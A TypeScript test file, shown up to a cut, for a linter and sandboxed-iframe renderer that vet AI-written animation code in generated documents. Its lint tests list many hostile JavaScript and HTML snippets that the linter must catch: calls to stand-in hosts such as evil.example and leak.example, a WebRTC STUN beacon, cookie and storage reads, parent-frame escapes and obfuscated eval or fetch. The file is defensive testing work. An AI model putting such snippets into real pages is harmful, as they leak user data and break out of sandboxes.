/**
 * AI-authored animation block (07 §5.2, §6.2, §7.1 animation; design addendum 2026-11-08): static
 * lint, poster and text limits, caps at build, regenerate and merge time, the exact sandboxed
 * `srcdoc` frame with its own CSP and hashes, the parent CSP, validity, parse round-trips and the
 * other block consumers (draft validation, section text, merge serialization).
 */
import { createHash } from 'node:crypto';
import { parse as parseHtml } from 'parse5';
import { describe, expect, it } from 'vitest';
import {
  addSectionEli5Tab,
  applyMergePlan,
  buildDocumentModel,
  documentCsp,
  getSectionContext,
  parseDocument,
  renderDocument,
  replaceSection,
  scriptHash,
  STE_TAB_KEY,
  STE_TAB_LABEL,
  type DocBlock,
  type DocumentModel,
} from '../../../../src/main/document';
import {
  ANIMATION_KEEP,
  ANIMATION_SANDBOX,
  ANIMATION_SHELL_CSS,
  ANIMATION_SHELL_JS,
  ANIMATION_SHELLS,
  animationCodeProblems,
  frameParsesAsBuilt,
  MAX_ANIMATION_CSS,
  MAX_ANIMATION_HTML,
  MAX_ANIMATION_JS,
  MAX_ANIMATION_TITLE,
  animationCsp,
  animationHashes,
  animationSrcdoc,
  lintAnimation,
  parseAnimationSrcdoc,
  renderAnimationFigure,
} from '../../../../src/main/document/animation';
import { convertBlocks, type ConvertContext } from '../../../../src/main/document/validate';
import type { DocumentDraftTab, DraftBlock, SectionDraft } from '../../../../src/main/llm';
import { validateDraft } from '../../../../src/main/llm/structured';
import { sectionText } from '../../../../src/main/llm/tasks';
import { PACKING_ANIMATION, PACKING_JS, type AnimationDraft } from '../../../fixtures/documents/animation';
import { fixtureInput } from '../../../fixtures/documents/drafts';
import {
  MERGED_AT,
  MERGE_SOURCE_ID,
  MERGE_SOURCE_TITLE,
  WEAVE_PLAN,
  wovenFixture,
} from '../../../fixtures/documents/merge';
import { fixtureDocument } from '../../../fixtures/documents/models';
import { readGolden, STUB_RUNTIME } from '../../../fixtures/documents/runtime';
import { SeededIdSource } from '../../../helpers/ids';
import { validateDocument } from '../../../helpers/doc-validity';

type AnimationBlock = Extract<DocBlock, { type: 'animation' }>;

const A = PACKING_ANIMATION;
const NOW = '2026-09-28T09:00:00.000Z';

function convert(blocks: DraftBlock[], take?: () => boolean): { out: DocBlock[]; warnings: string[] } {
  const warnings: string[] = [];
  const ctx: ConvertContext = {
    idSource: new SeededIdSource(1),
    resolveFigure: () => undefined,
    warn: (w) => warnings.push(w),
    ...(take ? { takeAnimation: take } : {}),
  };
  return { out: convertBlocks(blocks, ctx), warnings };
}

const para = (md: string): DraftBlock => ({ type: 'paragraph', md });
const section = (heading: string, ...blocks: DraftBlock[]): SectionDraft => ({ heading, blocks });
const animationsOf = (m: DocumentModel): number =>
  m.tabs.reduce(
    (n, t) => n + t.sections.reduce((k, s) => k + s.blocks.filter((b) => b.type === 'animation').length, 0),
    0,
  );
const kept = (): AnimationBlock => {
  const b = convert([A]).out[0];
  if (b?.type !== 'animation') throw new Error('fixture animation was dropped');
  return b;
};
const sha = (s: string): string => `'sha256-${createHash('sha256').update(s, 'utf8').digest('base64')}'`;
const decode = (s: string): string =>
  s
    .replace(/&quot;/g, '"')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&');
const cspOf = (html: string): string =>
  /<meta http-equiv="Content-Security-Policy" content="([^"]*)">/.exec(html)?.[1] ?? '';
const srcdocOf = (html: string): string => decode(/<iframe [^>]*srcdoc="([^"]*)"/.exec(html)?.[1] ?? '');

describe('lint (design addendum: static lint, drop on a hit)', () => {
  it('passes the fixture animation and ordinary drawing code', () => {
    expect(lintAnimation({ js: PACKING_JS, css: A.css ?? '', html: '' })).toEqual([]);
    const benign = [
      "el.style.top = '5px'; var r = el.getBoundingClientRect(); var y = r.top + r.left;",
      "var box = { top: 1, left: 2 }; label.textContent = 'from the top of the queue';",
      'class Walker { constructor(x) { this.x = x; } }',
      'requestAnimationFrame(function () {}); setTimeout(function () { go(); }, 100);',
      "var s = 'the parent company'; // top of the queue",
      // Ordinary label words and variable names (reviewer findings, A1): not API uses.
      'var top = 10, left = 34; ctx.fillRect(left, top, 5, 5);',
      'const { top } = rect; var y = top + 2;',
      'function add(n, a, parent) { return ELI5.el(n, a, parent); }',
      'function put(x, parent) { parent.appendChild(x); }',
      "ELI5.readout('eval loss');",
      "ELI5.slider('L1 caches', 1, 4, 1, 2, go);",
      "ELI5.slider('cost of import', 0, 9, 1, 2, go); ELI5.readout('import tariff %');",
      "ELI5.readout('Cookies left'); var cookies = 12;",
      "c.fillText('Worker', 10, 20); c.fillText('dog will fetch the ball', 1, 2);",
      "label('play fetch with the navigator of the ship');",
      'var self = this; self.x = 1;',
      "var c = document.createElementNS('http://www.w3.org/2000/svg', 'circle');",
      "if (/'/.test(s)) n++; var top = 3;",
      'var r = a / b / 2; var q = (x) / 3;',
      "var t = 'a' + 'b'; var arr = [1, 2]; arr[i + 1] = 3;",
      // Common idioms the prompt never warned about (audit round 2): not API uses.
      'let frames = 0; function tick() { frames++; return frames < 60; }',
      'ELI5.raf(this.step.bind(this)); f.call(this, 1); g.apply(this, [1]);',
      "const rows = [['Rate', r.toFixed(2) + '%']]; rows.push(['Day ' + d, 'x']);",
      'var peak = { location: 3 }; ctx.fillRect(peak.location, 0, 2, 2);',
      'var jar = { cookie: 5 }; jar.cookie -= 1;',
      'class Worker { constructor(id) { this.id = id; } } var w = new Worker(1);',
      // Labels and comments that only look like the audit round 3 rules.
      "ELI5.button('Refresh', go); ELI5.readout('Rate: ' + r); var t = 'File: 3';",
      "var s = document.createElementNS('http://www.w3.org/2000/svg', 'g'); go(1); //draw the axes",
      "var x = 'a/b' + '/c'; label('ratio 1/2');",
    ];
    for (const js of benign) expect(lintAnimation({ js }), js).toEqual([]);
    expect(lintAnimation({ js: 'go()', css: 'div{background:url(data:image/png;base64,AAAA)}' })).toEqual([]);
    expect(
      lintAnimation({ js: 'go()', html: '<div class="row"><span id="v">0</span></div><svg><rect/></svg>' }),
    ).toEqual([]);
  });

  const js = [
    "fetch('https://x.example/a')",
    'var x = new XMLHttpRequest()',
    "new WebSocket('wss://x.example')",
    "new EventSource('/s')",
    "navigator.sendBeacon('/b', 'x')",
    'new RTCPeerConnection()',
    'new webkitRTCPeerConnection()',
    "new Worker('w.js')",
    "new SharedWorker('w.js')",
    "importScripts('x.js')",
    "import('https://x.example/m.js')",
    "eval('1+1')",
    "Function('return this')()",
    "new Function('a', 'return a')",
    "setTimeout('alert(1)', 10)",
    'setInterval("tick()", 10)',
    "location.href = 'https://x.example'",
    "location = 'https://x.example'",
    "window.open('https://x.example')",
    'open("https://x.example")',
    'var d = top.document',
    'parent.document.title',
    'opener.focus()',
    'var c = document.cookie',
    "localStorage.setItem('a', '1')",
    "sessionStorage.getItem('a')",
    "indexedDB.open('db')",
    "postMessage('x', '*')",
    "el.innerHTML = '<iframe></iframe>'",
    "el.innerHTML = '<form action=x></form>'",
    'el.innerHTML = \'<a href="https://x.example">x</a>\'',
    "el.innerHTML = '<meta http-equiv=refresh>'",
    "el.innerHTML = '<base href=x>'",
    "el.innerHTML = '<script src=x></script>'",
    "el.style.background = 'url(https://x.example/a.png)'",
    'var s = "</script><script>alert(1)</script>"',
    // a cloned shell meta turned into a refresh, the Navigation API, URLs inside strings (audit round 3)
    "var m = document.head.querySelector('meta').cloneNode(); m.setAttribute('http-equiv', 'refresh'); m.setAttribute('content', '0;url=http:' + '/' + '/127.0.0.1:47123/meta'); document.head.appendChild(m);",
    'var m = ELI5.stage.firstChild.cloneNode(true); document.body.appendChild(m);',
    'var n = document.importNode(x, true);',
    'var d = document.implementation.createDocument(ns, q);',
    "x.setAttribute('content', '0; URL=https://evil.example/')",
    "m.httpEquiv = 'Refresh';",
    "navigation.navigate('http:' + '/' + '/evil.example/x')",
    "label('see https://evil.example/x')",
    "go('0;url=//evil.example/')",
    "var u = '/' + '/evil.example';",
    "var u = 'https:' + host;",
    // obfuscation heuristics
    "[]['constructor']['constructor']('return fetch')()",
    "(function () {}).constructor('return 1')()",
    "window['fe' + 'tch']('x')",
    "globalThis['ev' + 'al']('1')",
    'self[name]()',
    "Reflect.get(window, 'fetch')",
    "var f = atob('ZmV0Y2g=')",
    // member-qualified escape APIs and aliasing (reviewer findings, A1)
    "window.location.href = 'https://x.example/'",
    "document.location = 'https://x.example/'",
    'var p = window.parent; p.document',
    'var t = self.top; t.document.title',
    "var t = window.top; t['post' + 'Message']({}, '*')",
    'var t = c ? top : 0;',
    'var w = top; w.document;',
    'x.parent.document.title',
    'var w = window; w[0];',
    'this[name]()',
    'document.defaultView.frames',
    // a regex literal must not hide the code after it
    "var r = /'/; var z = location;",
    "var r = /'/; var t = top;",
    'var r = /"/g, u = window.open;',
    // a second realm and HTML-string sinks (WebRTC, DNS prefetch)
    "var f = ELI5.el('iframe', {}, ELI5.stage); var w = f.contentWindow; var C = w['RTCPeer' + 'Connection'];",
    "var f = document.createElement('iframe'); document.body.appendChild(f);",
    'var d = f.contentDocument;',
    "ELI5.el('link', { rel: 'dns-prefetch', href: '//x.evil.example' }, document.head)",
    "document.createElementNS('http://www.w3.org/1999/xhtml', 'iframe')",
    "el.innerHTML = '<b>x</b>'",
    "el.outerHTML = 'x'",
    "el.insertAdjacentHTML('beforeend', 'x')",
    "new DOMParser().parseFromString('x', 'text/html')",
    "document.write('x')",
    "range.createContextualFragment('x')",
    "var i = new Image(); i.src = 'https://leak.example/p.png';",
    // audit round 2: customized built-ins, the window through a member, narrowed rules' edges
    "class A extends HTMLAnchorElement {}; customElements.define('x-a', A, { extends: 'a' }); new A();",
    'class F extends window.HTMLIFrameElement {}',
    "window.customElements.define('x-f', F)",
    "const g = globalThis.window; g[0]; Object.getOwnPropertyNames(g).find((n) => n.endsWith('erConnection'));",
    'var w = self.window;',
    'var f = globalThis.frames;',
    'var w = document.self;',
    'frames[0].postMe = 1;',
    'var n = frames.length;',
    'go(1, this);',
    'f.call(x, this);',
    "const d = document; d.location = 'x';",
    'el.ownerDocument.location.reload();',
    'var c = el.getRootNode().cookie;',
    'var w = window.location;',
    "self.location.assign('x')",
    'var W = globalThis.Worker; new W();',
    "class Worker {} new window.Worker('w.js');",
    "var k = x['ev' + 'al'];",
    "f()?.['ev' + 'al']",
  ];
  it.each(js)('drops js: %s', (code) => {
    expect(lintAnimation({ js: code }).length).toBeGreaterThan(0);
  });

  const html = [
    '<script>go()</script>',
    '<iframe srcdoc="x"></iframe>',
    '<img src="https://x.example/a.png">',
    '<div onclick="go()">x</div>',
    '<a href="https://x.example">x</a>',
    '<form><input></form>',
    '<meta http-equiv="refresh" content="0">',
    '<base href="https://x.example/">',
    '<link rel="stylesheet" href="x.css">',
    '<object data="x"></object>',
    '<embed src="x">',
    '<a href="javascript:go()">x</a>',
  ];
  it.each(html)('drops html: %s', (code) => {
    expect(lintAnimation({ js: 'go()', html: code }).length).toBeGreaterThan(0);
  });

  const css = [
    "@import 'x.css';",
    'div{background:url(https://x.example/a.png)}',
    '</style><script>',
    'b{x:expression(1)}',
  ];
  it.each(css)('drops css: %s', (code) => {
    expect(lintAnimation({ js: 'go()', css: code }).length).toBeGreaterThan(0);
  });
});

describe('the shell cannot be swallowed by malformed markup (audit round 1)', () => {
  const webrtc =
    "var C = Object.getOwnPropertyNames(this).filter(function (k) { return k.indexOf('RTCP') === 0; })[0]; " +
    "var pc = new (Object.getOwnPropertyDescriptor(this, C).value)({ iceServers: [{ urls: 'stun:' + 'beacon.example.net:3478' }] }); " +
    "pc.createDataChannel('x'); pc.createOffer().then(function (o) { pc.setLocalDescription(o); });";

  it.each([
    ['an unclosed attribute quote', "<p class='"],
    ['an unclosed double quote', '<p title="x'],
    ['an unclosed comment', '<p>a</p><!-- x'],
    ['a raw-text textarea', '<textarea>'],
    ['a title', '<title>'],
    ['a template', '<template><p>x'],
    ['a noscript', '<noscript>'],
    ['an xmp', '<xmp>'],
    ['a plaintext', '<plaintext>'],
    ['a stray main close', '</main><p>x</p>'],
  ])('drops html with %s, and validity refuses the frame', (_, html) => {
    expect(frameParsesAsBuilt({ js: PACKING_JS, html })).toBe(false);
    expect(animationCodeProblems({ js: PACKING_JS, html })).toContain('markup:structure');
    expect(parseAnimationSrcdoc(animationSrcdoc({ js: PACKING_JS, html }))).toBeNull();
    expect(convert([{ ...A, html }]).out).toEqual([]);
  });

  it('keeps well-formed html and css (including unclosed p and li, which parse cleanly)', () => {
    for (const html of [
      '',
      '<p>Hello</p>',
      '<p>One<p>Two',
      '<ul><li>a<li>b</ul>',
      '<div class="x" title=\'a "b"\'></div>',
    ])
      expect(frameParsesAsBuilt({ js: PACKING_JS, html, css: 'p{color:red}' }), html).toBe(true);
    expect(frameParsesAsBuilt(A)).toBe(true);
  });

  it('lints the WebRTC beacon through top-level this', () => {
    const hits = lintAnimation({ js: webrtc });
    expect(hits).toEqual(expect.arrayContaining(['js:ice-url', 'js:ice', 'js:this-global']));
    expect(animationCodeProblems({ html: "<p class='", js: webrtc }).length).toBeGreaterThan(0);
  });

  it.each([
    ['reflection over this', 'var k = Object.getOwnPropertyNames(this);'],
    ['this.frames', 'var f = this.frames[0];'],
    ['for-in over this', 'for (var k in this) go(k);'],
    ['a TURN server string', "var s = 'turn:relay.example.net';"],
  ])('flags %s', (_, js) => {
    expect(lintAnimation({ js }).length, js).toBeGreaterThan(0);
  });
});

describe('convert (07 §5.2)', () => {
  it('keeps a valid animation: text and code as given, poster sanitized', () => {
    const { out, warnings } = convert([A]);
    expect(warnings).toEqual([]);
    const b = out[0];
    if (b?.type !== 'animation') throw new Error('dropped');
    expect(b.title).toBe(A.title);
    expect(b.caption).toBe(A.caption);
    expect(b.alt).toBe(A.alt);
    expect(b.js).toBe(A.js);
    expect(b.css).toBe(A.css);
    expect(b.html).toBeUndefined();
    expect(b.poster.startsWith('<svg')).toBe(true);
    expect(b.poster).not.toBe(A.poster); // sanitized: ids, role, aria-label
  });

  it('caps the text and normalizes line breaks in the code', () => {
    const { out } = convert([
      { ...A, title: 'x '.repeat(200), caption: 'y '.repeat(400), alt: 'z '.repeat(400), js: 'go();\r\nstop();' },
    ]);
    const b = out[0];
    if (b?.type !== 'animation') throw new Error('dropped');
    expect(b.title.length).toBeLessThanOrEqual(MAX_ANIMATION_TITLE);
    expect(b.caption.length).toBeLessThanOrEqual(300);
    expect(b.alt.length).toBeLessThanOrEqual(400);
    expect(b.js).toBe('go();\nstop();');
  });

  const bad: [string, AnimationDraft][] = [
    ['no poster', { ...A, poster: '' }],
    ['a poster that is not SVG', { ...A, poster: '<div>picture</div>' }],
    ['an empty alt', { ...A, alt: '  ' }],
    ['an empty title', { ...A, title: ' ' }],
    ['no code', { ...A, js: ' ' }],
    ['js over the cap', { ...A, js: `/*${'x'.repeat(MAX_ANIMATION_JS)}*/go()` }],
    ['html over the cap', { ...A, html: `<p>${'x'.repeat(MAX_ANIMATION_HTML)}</p>` }],
    ['css over the cap', { ...A, css: `p{}/*${'x'.repeat(MAX_ANIMATION_CSS)}*/` }],
    ['a lint hit', { ...A, js: `${PACKING_JS}\nfetch('https://x.example')` }],
    ['the keep marker outside a regenerated section', { ...A, poster: ANIMATION_KEEP, js: ANIMATION_KEEP }],
    ['the keep marker as js with a real poster', { ...A, js: ANIMATION_KEEP }],
    ['the keep marker as poster with real js', { ...A, poster: ANIMATION_KEEP }],
  ];
  it.each(bad)('drops an animation with %s (animation-dropped, never a repair)', (_name, b) => {
    const { out, warnings } = convert([b, para('kept')]);
    expect(out).toEqual([{ type: 'paragraph', md: 'kept' }]);
    expect(warnings).toEqual(['animation-dropped']);
  });

  it('keeps one per section and asks the tab/document budget for each', () => {
    let asked = 0;
    const { out, warnings } = convert([A, para('a'), A], () => {
      asked++;
      return true;
    });
    expect(out.map((b) => b.type)).toEqual(['animation', 'paragraph']);
    expect(warnings).toEqual(['animation-dropped']);
    expect(asked).toBe(1);
    expect(convert([A], () => false).out).toEqual([]);
  });
});

describe('caps in documents (07 §5.2: 1 per section, 2 per tab, 4 per document)', () => {
  const tab = (kind: 'indepth' | 'eli5', n: number): DocumentDraftTab => ({
    kind,
    title: 'Animations',
    sections: Array.from({ length: n }, (_, i) => section(`Section ${i + 1}`, para(`Text ${i + 1}.`), A)),
  });

  it('build keeps two per tab and four per document; a section ELI5 tab cannot add a fifth', () => {
    const r = buildDocumentModel({ ...fixtureInput('full'), indepth: tab('indepth', 3), eli5: tab('eli5', 3) });
    expect(
      r.model.tabs.map((t) => t.sections.filter((s) => s.blocks.some((b) => b.type === 'animation')).length),
    ).toEqual([2, 2]);
    expect(r.warnings.filter((w) => w === 'animation-dropped')).toHaveLength(2);
    const from = r.model.tabs[0]?.sections[0]?.id;
    if (!from) throw new Error('fixture');
    const added = addSectionEli5Tab(r.model, from, 'Text 1.', tab('section-eli5' as 'eli5', 1), NOW, {
      idSource: new SeededIdSource(9),
    });
    expect(animationsOf(added.model)).toBe(4);
    expect(added.warnings).toContain('animation-dropped');
  });

  it('a regenerated section counts the other sections of its tab', () => {
    const r = buildDocumentModel({ ...fixtureInput('full'), indepth: tab('indepth', 3) });
    const sections = r.model.tabs[0]?.sections ?? [];
    const third = sections[2];
    const first = sections[0];
    if (!third || !first) throw new Error('fixture');
    const a = replaceSection(r.model, third.id, section('Again', para('New.'), A), 'expand', NOW);
    expect(a.warnings).toContain('animation-dropped');
    expect(animationsOf(a.model)).toBe(2);
    const b = replaceSection(r.model, first.id, section('Again', para('New.'), A), 'expand', NOW);
    expect(b.warnings).not.toContain('animation-dropped');
    expect(animationsOf(b.model)).toBe(2);
  });
});

describe('section regenerate keeps animations (08 §6.4, design addendum)', () => {
  const doc = () =>
    buildDocumentModel({
      ...fixtureInput('full'),
      indepth: { kind: 'indepth', title: 'T', sections: [section('S', para('Text.'), A)] },
    });

  it('a section ELI5 tab honours the keep marker its prompt offers, as a copy within the caps (audit round 3)', () => {
    // A poster with ids, so the copy's id prefix can be checked.
    const poster =
      '<svg viewBox="0 0 100 40"><defs><marker id="arrow" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" ' +
      'markerHeight="6" orient="auto"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker></defs>' +
      '<path d="M5 20L90 20" stroke="currentColor" marker-end="url(#arrow)"/></svg>';
    const { model } = buildDocumentModel({
      ...fixtureInput('full'),
      indepth: { kind: 'indepth', title: 'T', sections: [section('S', para('Text.'), { ...A, poster })] },
    });
    const sec = model.tabs[0]?.sections[0];
    if (!sec) throw new Error('fixture');
    const old = sec.blocks.find((b) => b.type === 'animation') as AnimationBlock;
    const keep: DraftBlock = {
      type: 'animation',
      title: '',
      caption: '',
      alt: '',
      poster: ANIMATION_KEEP,
      js: ANIMATION_KEEP,
    };
    const draft: DocumentDraftTab = {
      kind: 'section-eli5' as 'eli5',
      title: 'Simple',
      sections: [section('S', para('Easy.'), keep)],
    };
    const r = addSectionEli5Tab(model, sec.id, 'Text.', draft, NOW, { idSource: new SeededIdSource(9) });
    expect(r.warnings).not.toContain('animation-dropped');
    const copy = r.model.tabs.at(-1)?.sections[0]?.blocks.find((b) => b.type === 'animation') as AnimationBlock;
    expect(copy.js).toBe(old.js);
    expect(copy.title).toBe(old.title);
    // The poster's ids get a fresh prefix, so the document never holds an svg id twice.
    const prefix = (svg: string): string | undefined => /\bid="(d[0-9a-f]{8}-)/.exec(svg)?.[1];
    expect(prefix(old.poster)).toBeDefined();
    expect(prefix(copy.poster)).not.toBe(prefix(old.poster));
    expect(
      validateDocument(renderDocument(r.model, new Map(), { runtime: STUB_RUNTIME })).errors.filter(
        (e) => e.rule !== 'references',
      ),
    ).toEqual([]);
    // The copy counts against the document cap: with four already, the marker is dropped.
    const full = buildDocumentModel({
      ...fixtureInput('full'),
      indepth: { kind: 'indepth', title: 'T', sections: [1, 2].map((i) => section(`S${i}`, para('Text.'), A)) },
      eli5: { kind: 'eli5', title: 'E', sections: [1, 2].map((i) => section(`E${i}`, para('Text.'), A)) },
    }).model;
    const from = full.tabs[0]?.sections[0]?.id;
    if (!from) throw new Error('fixture');
    const capped = addSectionEli5Tab(full, from, 'Text.', draft, NOW, { idSource: new SeededIdSource(9) });
    expect(animationsOf(capped.model)).toBe(4);
    expect(capped.warnings).toContain('animation-dropped');
  });

  it('the model sees the animation as a keep marker, never its code or poster', () => {
    const { model } = doc();
    const id = model.tabs[0]?.sections[0]?.id;
    if (!id) throw new Error('fixture');
    const ctx = getSectionContext(model, id);
    const b = ctx.draft.blocks[1];
    expect(b).toEqual({
      type: 'animation',
      title: A.title,
      caption: A.caption,
      alt: A.alt,
      poster: ANIMATION_KEEP,
      js: ANIMATION_KEEP,
    });
    expect(JSON.stringify(ctx.draft)).not.toContain('ELI5.canvas');
  });

  it('a keep marker brings the same animation back (new text allowed); leaving it out removes it', () => {
    const { model } = doc();
    const sec = model.tabs[0]?.sections[0];
    if (!sec) throw new Error('fixture');
    const old = sec.blocks[1] as AnimationBlock;
    const marker: DraftBlock = {
      type: 'animation',
      title: 'New title',
      caption: '',
      alt: A.alt,
      poster: ANIMATION_KEEP,
      js: ANIMATION_KEEP,
    };
    const r = replaceSection(model, sec.id, section('S', para('Rewritten.'), marker), 'reexplain', NOW);
    expect(r.warnings).toEqual([]);
    const b = r.model.tabs[0]?.sections[0]?.blocks[1];
    expect(b).toEqual({ ...old, title: 'New title', caption: old.caption });
    const gone = replaceSection(model, sec.id, section('S', para('Rewritten.')), 'reexplain', NOW);
    expect(animationsOf(gone.model)).toBe(0);
  });
});

describe('caps in merges (07 §5.2, §8.1)', () => {
  const atCap = () => {
    const { prep } = wovenFixture();
    const model = structuredClone(prep.target.model);
    const indepth = model.tabs[0];
    if (!indepth) throw new Error('fixture');
    let n = 0;
    indepth.sections = indepth.sections.map((s) =>
      s.kind === 'content' && n++ < 2 ? { ...s, blocks: [...s.blocks, kept()] } : s,
    );
    return { ...prep, target: { ...prep.target, model } };
  };
  const apply = (prep: ReturnType<typeof atCap>, plan = WEAVE_PLAN) =>
    applyMergePlan(prep, plan, {
      fromDocId: MERGE_SOURCE_ID,
      fromTitle: MERGE_SOURCE_TITLE,
      mergedAt: MERGED_AT,
      idSource: new SeededIdSource(42),
    });

  it('kept animations survive a merge byte for byte', () => {
    const r = apply(atCap(), { ...WEAVE_PLAN, indepth: { revise: [], insert: [] } } as typeof WEAVE_PLAN);
    expect(animationsOf(r.model)).toBe(2);
    expect(r.model.tabs[0]?.sections.flatMap((s) => s.blocks.filter((b) => b.type === 'animation'))).toEqual([
      kept(),
      kept(),
    ]);
  });

  it('a new animation beyond the tab cap is dropped unless a revision released a slot', () => {
    const prep = atCap();
    const plan = structuredClone(WEAVE_PLAN);
    const ins = plan.indepth.insert[0];
    if (!ins) throw new Error('fixture');
    ins.blocks = [...ins.blocks, A];
    plan.indepth.revise = [];
    const r = apply(prep, plan);
    expect(r.warnings).toContain('animation-dropped');
    expect(animationsOf(r.model)).toBe(2);
    const freed = apply(prep, { ...plan, indepth: { ...plan.indepth, revise: WEAVE_PLAN.indepth.revise } });
    expect(freed.warnings).not.toContain('animation-dropped');
    expect(animationsOf(freed.model)).toBe(2);
  });
});

describe('ASD-STE100 mirrors and the caps (07 §5.1 step 2, §5.2; audit round 1)', () => {
  const perTab = (m: DocumentModel): number[] =>
    m.tabs.map((t) => t.sections.reduce((n, s) => n + s.blocks.filter((b) => b.type === 'animation').length, 0));
  const marker: DraftBlock = {
    type: 'animation',
    title: A.title,
    caption: A.caption,
    alt: A.alt,
    poster: ANIMATION_KEEP,
    js: ANIMATION_KEEP,
  };
  // In depth 2, ELI5 2 (the document cap), STE mirrors both in-depth animations.
  const steDoc = () => {
    const two = (kind: 'indepth' | 'eli5'): DocumentDraftTab => ({
      kind,
      title: 'Animations',
      sections: [section('One', para('Text 1.'), A), section('Two', para('Text 2.'), A)],
    });
    return buildDocumentModel({
      ...fixtureInput('full'),
      indepth: two('indepth'),
      eli5: two('eli5'),
      ste: {
        tab: {
          kind: 'ste',
          title: 'Simple',
          sections: [section('One', para('Text.'), A), section('Two', para('Text.'), A)],
        },
        origins: [],
      },
    });
  };

  it('build keeps the mirrors without spending the document cap', () => {
    const r = steDoc();
    expect(perTab(r.model)).toEqual([2, 2, 2]);
    expect(r.warnings).not.toContain('animation-dropped');
  });

  it('regenerating a section with the keep marker never loses its animation to the mirrors', () => {
    const { model } = steDoc();
    for (const tab of model.tabs) {
      const sec = tab.sections.find((s) => s.blocks.some((b) => b.type === 'animation'));
      if (!sec) throw new Error('fixture');
      const r = replaceSection(model, sec.id, section('Again', para('Reworded.'), marker), 'reexplain', NOW);
      expect(r.warnings).not.toContain('animation-dropped');
      expect(perTab(r.model)).toEqual([2, 2, 2]);
    }
  });

  it('a new animation still respects the document cap (mirrors excluded)', () => {
    const { model } = steDoc();
    const sec = model.tabs[0]?.sections[0];
    if (!sec) throw new Error('fixture');
    const gone = replaceSection(model, sec.id, section('Again', para('No visual.')), 'reexplain', NOW);
    expect(perTab(gone.model)).toEqual([1, 2, 2]);
    const back = replaceSection(gone.model, sec.id, section('Again', para('New one.'), A), 'expand', NOW);
    expect(back.warnings).not.toContain('animation-dropped');
    expect(perTab(back.model)).toEqual([2, 2, 2]);
  });

  it('regenerating an STE section never adds or changes a visual (08 §6.3; audit round 2)', () => {
    const table: DraftBlock = { type: 'table', header: ['Step', 'Rate'], rows: [['1', '2%']] };
    const { model } = buildDocumentModel({
      ...fixtureInput('full'),
      indepth: { kind: 'indepth', title: 'T', sections: [section('One', para('Text 1.'), A)] },
      ste: { tab: { kind: 'ste', title: 'S', sections: [section('One', para('Text.'), A, table)] }, origins: [] },
    });
    const steTab = model.tabs.find((t) => t.kind === 'ste');
    const sec = steTab?.sections[0];
    if (!sec) throw new Error('fixture');
    const ownTable = sec.blocks.find((b) => b.type === 'table');
    const chart: DraftBlock = {
      type: 'chart',
      chart: { kind: 'bar', title: 'New', categories: ['a', 'b'], series: [{ name: 's', values: [1, 2] }] },
    } as DraftBlock;
    const changedTable: DraftBlock = { type: 'table', header: ['Step', 'Rate'], rows: [['9', '99%']] };
    // A new animation, a new chart and a changed table: only the kept animation and the own table stay.
    const r = replaceSection(model, sec.id, section('Again', para('Short.'), A, changedTable, chart), 'reexplain', NOW);
    const out = r.model.tabs.find((t) => t.kind === 'ste')?.sections[0]?.blocks ?? [];
    expect(out.filter((b) => b.type === 'animation')).toHaveLength(0);
    expect(r.warnings).toContain('animation-dropped');
    expect(r.warnings).toContain('ste-visual-dropped');
    expect(out.filter((b) => b.type === 'chart')).toHaveLength(0);
    expect(out.filter((b) => b.type === 'table')).toEqual([ownTable]);
    // The keep marker keeps the animation; a table the model left out comes back unchanged.
    const k = replaceSection(model, sec.id, section('Again', para('Short.'), marker), 'reexplain', NOW);
    const kept2 = k.model.tabs.find((t) => t.kind === 'ste')?.sections[0]?.blocks ?? [];
    expect(kept2.filter((b) => b.type === 'animation')).toHaveLength(1);
    expect(kept2.filter((b) => b.type === 'table')).toEqual([ownTable]);
    expect(k.warnings).toContain('ste-visual-restored');
    expect(perTab(k.model)).toEqual(perTab(model));
  });

  it('a merge does not count the STE tab it drops', () => {
    const { prep } = wovenFixture();
    const model = structuredClone(prep.target.model);
    const [indepth, eli5] = model.tabs;
    if (!indepth || !eli5) throw new Error('fixture');
    const withOne = (secs: typeof indepth.sections) => {
      let n = 0;
      return secs.map((s) => (s.kind === 'content' && n++ < 1 ? { ...s, blocks: [...s.blocks, kept()] } : s));
    };
    indepth.sections = withOne(indepth.sections);
    eli5.sections = withOne(eli5.sections);
    const mirror = (i: number) => ({
      id: `sec-ste-0000000${i}` as (typeof indepth.sections)[number]['id'],
      kind: 'content' as const,
      heading: `Mirror ${i}`,
      blocks: [{ type: 'paragraph' as const, md: 'Text.' }, kept()],
      origin: 'generated' as const,
      updatedAt: NOW,
    });
    model.tabs.splice(2, 0, {
      key: STE_TAB_KEY,
      kind: 'ste',
      label: STE_TAB_LABEL,
      createdAt: NOW,
      sections: [mirror(1), mirror(2)],
    });
    const plan = structuredClone(WEAVE_PLAN);
    const ins = plan.indepth.insert[0];
    if (!ins) throw new Error('fixture');
    ins.blocks = [...ins.blocks, A];
    plan.indepth.revise = [];
    const r = applyMergePlan({ ...prep, target: { ...prep.target, model } }, plan, {
      fromDocId: MERGE_SOURCE_ID,
      fromTitle: MERGE_SOURCE_TITLE,
      mergedAt: MERGED_AT,
      idSource: new SeededIdSource(42),
    });
    expect(r.warnings).toContain('ste-dropped');
    expect(r.warnings).not.toContain('animation-dropped');
    // The new in-depth animation fits: 1 + 1 held before it, the two mirrors are not counted.
    expect(perTab(r.model)[0]).toBe(2);
  });
});

describe('the sandboxed frame (07 §6.2, §7.1)', () => {
  const b = kept();
  const html = renderAnimationFigure(b, 'sec-indepth-0000aaaa-b1');

  it('renders exactly one iframe of the only allowed shape', () => {
    expect(ANIMATION_SANDBOX).toBe('allow-scripts');
    const frames = html.match(/<iframe\b[^>]*>/g) ?? [];
    expect(frames).toHaveLength(1);
    const tag = frames[0] ?? '';
    expect(tag.startsWith('<iframe sandbox="allow-scripts" srcdoc="')).toBe(true);
    expect(tag).toMatch(
      / title="One packer short and the line never catches up" referrerpolicy="no-referrer" loading="lazy" aria-describedby="sec-indepth-0000aaaa-b1-cap">$/,
    );
    expect(tag).not.toMatch(/\ssrc=|allow-same-origin|allow-forms|allow-popups|allow-modals|allow-top-navigation/);
    expect(html).toContain('<figcaption class="anim-cap" id="sec-indepth-0000aaaa-b1-cap">');
    expect(html.startsWith('<figure class="animation">')).toBe(true);
    expect(html).not.toContain('data-eli5-noact'); // print hides it (07 §13)
    expect(html).toContain('<div class="anim-poster">');
    expect(html.indexOf('anim-poster')).toBeLessThan(html.indexOf('<iframe'));
  });

